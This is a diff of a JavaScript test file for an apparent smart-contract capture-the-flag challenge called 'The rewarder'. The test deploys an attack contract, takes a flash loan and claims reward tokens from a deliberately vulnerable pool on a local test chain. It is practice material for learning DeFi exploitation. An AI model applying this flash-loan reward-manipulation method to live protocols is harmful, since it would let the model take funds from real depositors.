@@ -67,14 +67,20 @@ describe('[Challenge] The rewarder', function () {
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
         console.log('attacker ', attacker.address)
-        const AttackFactory = await ethers.getContractFactory('Attacker', deployer);
-        this.attackContract = await AttackFactory.deploy(this.flashLoanPool.address, this.rewarderPool.address, this.liquidityToken.address);
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
+
+        const AttackFactory = await ethers.getContractFactory('AttackRewarder', attacker);
+        this.attackContract = await AttackFactory.deploy(this.liquidityToken.address, this.flashLoanPool.address, this.rewarderPool.address, attacker.address, this.rewardToken.address);
         // await this.liquidityToken.connect(attacker).approve(this.rewarderPool.address, ethers.utils.parseEther('100'));
         // await this.liquidityToken.transfer(this.attackContract.address, ethers.utils.parseEther('100'));
-        await this.attackContract.connect(attacker).attackBro()
-        console.log("WE FINISHED")
-        await ethers.provider.send("evm_increaseTime", [6 * 24 * 60 * 60]); // 5 days
+        console.log(`Attack contract address ${this.attackContract.address}`)
+        // await this.liquidityToken.approve(this.rewarderPool.address, 10 ** 20, {from: this.attackContract.signer.address})
+        await this.attackContract.startFlashLoan(TOKENS_IN_LENDER_POOL)
 
+
+        await this.attackContract.claimReward();
+
+        console.log("Attacker reward token ", await this.rewardToken.balanceOf(attacker.address))
     });
 
     after(async function () {
